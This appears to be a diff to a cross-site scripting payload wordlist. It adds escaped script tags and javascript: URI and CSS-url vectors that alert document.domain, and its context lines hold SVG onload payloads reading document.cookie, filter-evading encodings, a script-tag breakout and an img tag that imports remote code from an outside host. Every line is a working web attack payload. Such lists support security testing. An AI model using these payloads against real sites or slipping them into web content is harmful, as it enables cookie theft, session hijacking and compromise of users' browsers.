@@ -10,6 +10,12 @@
 <svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
 <Img Src=//14.rs OnLoad%0C=import(Src)>
+background-color:#f00;background:url("javascript:alert(document.domain);");
+\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
+\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+#!javascript:alert(document.domain);
+!javascript:alert(document.domain);
+javascript:alert(document.domain);
 %3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
 %3Csvg%20onload=alert(%22MrHex88%22)%3E
 </script>'"><img src=x onError=prompt(1)>
